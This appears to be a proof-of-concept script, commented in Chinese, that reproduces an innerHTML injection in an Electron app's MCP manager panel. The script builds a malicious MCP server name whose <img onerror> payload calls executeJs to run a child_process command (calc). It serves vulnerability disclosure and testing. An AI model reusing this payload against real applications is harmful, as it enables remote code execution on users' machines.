/**
 * PoC: overlay/panels/mcp-manager.ts renderMcpList —— MCP server name 未转义进 innerHTML
 * 复现源码 exact 拼接（src/overlay/panels/mcp-manager.ts:46-47）：
 *   '<div class="mcp-item" data-mcp-name="' + s.name + '">' +
 *   '<span class="mcp-status">' + ... + '</span>' +
 *   '<span class="cuckoo-window-name">' + s.name + '</span>'
 *
 * s.name 来自项目 .agents/mcp.json 的 JSON key（文件在项目工作目录内，AI 可写、
 * 克隆恶意仓库即可植入），经 IPC list-mcp-servers 直达此模板，全程无转义。
 *
 * 注：overlay 跑在 AI 网页渲染进程，window.electronAPI 已被 contextBridge +
 * 兜底直挂暴露到 main world（bridge/api.ts:255-260）；innerHTML 注入的
 * <img onerror> 在 main world 执行 → 可触达 window.electronAPI.executeJs 等。
 */

// —— 复现 overlay 的 escapeHtml（panel.ts:73-77），证明它在本场景不可用 ——
function overlayEscapeHtml(text) {
  const div = { textContent: text, innerHTML: '' };
  div.innerHTML = div.textContent; // DOM 语义：只转义 & < >
  return div.innerHTML;
}
// Node 里没有 DOM，按浏览器 innerHTML 语义模拟（textContent→innerHTML 仅转义 &<>）
function simulateBrowserInnerHtml(text) {
  return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// —— 模拟 mcp-manager.ts:46-47 的 exact 模板 ——
function renderMcpItem(s) {
  return '<div class="mcp-item" data-mcp-name="' + s.name + '">' +
    '<span class="mcp-status">' + (s.connected ? '●' : '○') + '</span>' +
    '<span class="cuckoo-window-name">' + s.name + '</span>';
}

// —— 攻击载荷：植入项目 .agents/mcp.json 的 server 名 ——
const malicious = {
  name: 'x"><img src=x onerror="window.electronAPI.executeJs(\'require(\\\"child_process\\\").exec(\\\"calc\\\")\')"><span data="',
  connected: true,
};

const out = renderMcpItem(malicious);
console.log('--- renderMcpList 实际产出（将被赋给 panel.innerHTML）---');
console.log(out);
console.log();
console.log('=> 载荷标签原样保留（<img onerror 未被转义）:', /<img[^>]*onerror=/i.test(out));
console.log('=> overlayEscapeHtml 对它的处理也挡不住（内容位 vs 属性位）:',
  simulateBrowserInnerHtml(malicious.name).includes('<img'));
